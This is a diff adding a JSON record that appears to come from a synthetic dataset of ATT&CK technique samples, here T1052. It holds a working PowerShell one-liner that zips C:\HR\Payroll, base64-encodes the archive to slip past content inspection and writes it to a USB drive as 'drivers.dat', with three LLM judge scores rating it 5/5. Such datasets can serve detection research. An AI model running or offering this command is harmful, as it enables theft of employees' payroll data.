@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $zip=Join-Path $env:TEMP 'sdata.zip'; Compress-Archive -Path 'C:\\HR\\Payroll' -DestinationPath $zip -Force; [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip)) | Out-File -Encoding ASCII (Join-Path $usb 'drivers.dat')",
+  "explanation": "Compresses sensitive files and writes a base64-encoded archive to the first detected removable drive.",
+  "rationale_steps": [
+    "Identify first removable drive letter",
+    "Compress local target data",
+    "Base64-encode to evade simple content inspection",
+    "Write encoded payload to USB device"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-b5822822",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, braces, and parentheses, valid pipelines and separators, and correctly used parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "It finds a removable drive, compresses C:\\HR\\Payroll, base64-encodes the archive, and writes it to that drive as 'drivers.dat', matching exfiltration over a physical medium (T1052).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:31:21.988318Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses, proper variable assignments, correct PowerShell cmdlet usage, and appropriate piping of output between commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by identifying a removable drive, compressing sensitive HR/Payroll data, encoding it to evade detection, and exfiltrating it to the physical medium with an innocuous filename.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:31:24.853024Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid PowerShell cmdlets, .NET methods, operators, and proper syntax for variable assignment, piping, and parameter passing.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the stated intent by compressing specified files, base64 encoding the archive, and writing the result to a detectable removable drive, fully aligning with the MITRE ATT&CK T1052 technique for exfiltration over a physical medium using staging, obfuscation, and benign file naming.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:31:35.223338Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
